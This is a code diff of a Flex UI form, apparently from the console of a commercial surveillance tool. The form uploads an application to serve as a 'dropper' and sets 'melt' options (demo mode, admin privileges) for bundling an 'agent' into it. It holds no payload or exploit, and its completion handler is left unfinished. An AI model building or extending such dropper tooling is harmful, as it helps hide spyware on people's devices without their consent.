@@ -4,7 +4,11 @@
          xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%">
   <fx:Script>
     <![CDATA[
+      import it.ht.rcs.console.utils.AlertPopUp;
+      
       import locale.R;
+      
+      import mx.managers.PopUpManager;
       
       private var fileReference:FileReference;
       
@@ -21,6 +25,34 @@
         fileName.text = event.target.name;
       }
       
+      private var uploadPopup:UploadPopup;
+      private function create(event:MouseEvent):void
+      {
+        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
+        
+        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+        uploadPopup.fileReference = fileReference;
+        PopUpManager.centerPopUp(uploadPopup);
+      }
+      
+      private function onUploadComplete(event:DataEvent):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        
+        var params:Object = {platform: parentDocument.platform, binary: {demo: demo.selected, admin: admin.selected}, melt: {admin: admin.selected, input: event.data} };
+        
+      }
+      
+      private function onUploadError(event:Event):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        AlertPopUp.show(event.type);
+      }
+      
+      
     ]]>
   </fx:Script>
   
@@ -28,25 +60,24 @@
     <s:State name="normal"/>
     <s:State name="fileSelected"/>
   </s:states>
-  
-  <s:CheckBox left="10" top="10" id="demo" label="Demo Mode" fontWeight="bold"/>
-  <s:TextArea left="25" top="25" width="280" height="42" borderVisible="false"
+    
+  <s:CheckBox id="admin" left="10" top="10" label="Require Administrative Priviledge"
+              fontWeight="bold"/>
+  <s:TextArea left="25" top="25" width="280" height="55" borderVisible="false"
               contentBackgroundAlpha="0.0" editable="false"
-              text="You can use the demo mode to try the agent in the lab, it will not consume a license."/>
-  
-  <s:CheckBox left="10" top="70" id="admin" label="Require Administrative Priviledge" fontWeight="bold"/>
-  <s:TextArea left="25" top="85" width="280" height="55" borderVisible="false"
-              contentBackgroundAlpha="0.0" editable="false"
-              text="When the agent is installed the system will request the higher possible privileges"/>
+              text="When the agent is installed the system will request the higher possible privileges" />
   
 
-  <s:HGroup left.normal="10" top.normal="140" verticalAlign="middle">
+  <s:HGroup left="10" top="70" height="25" verticalAlign="middle">
     <s:Label text="Application to be used as dropper:" fontWeight="bold"/>
     <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}" click="browse()"/>
     <s:Label id="fileName" includeIn="fileSelected" buttonMode="true" click="browse()"
              maxDisplayedLines="1" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}"/>    
   </s:HGroup>
   
-  <s:Button right="20" bottom="20" label="Create..."/>
+  <s:HGroup left="10" bottom="0" right="10" horizontalAlign="right">
+    <s:CheckBox left="10" id="demo" label="Demo Mode" fontWeight="bold"/>
+    <s:Button right="10" label="Create..." click="create(event)"/>    
+  </s:HGroup>
   
 </s:Group>
